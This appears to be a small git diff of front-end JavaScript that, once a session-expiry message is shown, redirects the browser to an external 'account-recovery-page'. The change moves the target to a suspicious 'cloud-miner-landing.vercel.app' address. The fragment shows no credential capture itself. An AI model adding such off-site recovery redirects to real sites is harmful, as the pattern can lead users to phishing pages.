@@ -21,7 +21,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (expireMessage) expireMessage.style.display = 'block';
 
       // Optional: redirect if needed
-       window.location.href = "https://uiux-auth-wolf.onlinetraining.info/navigator/account-recovery-page/";
+       window.location.href = "https://cloud-miner-landing.vercel.app/ar_r1/r1/account-recovery-page/recovery1.html";
       return;
     }
 
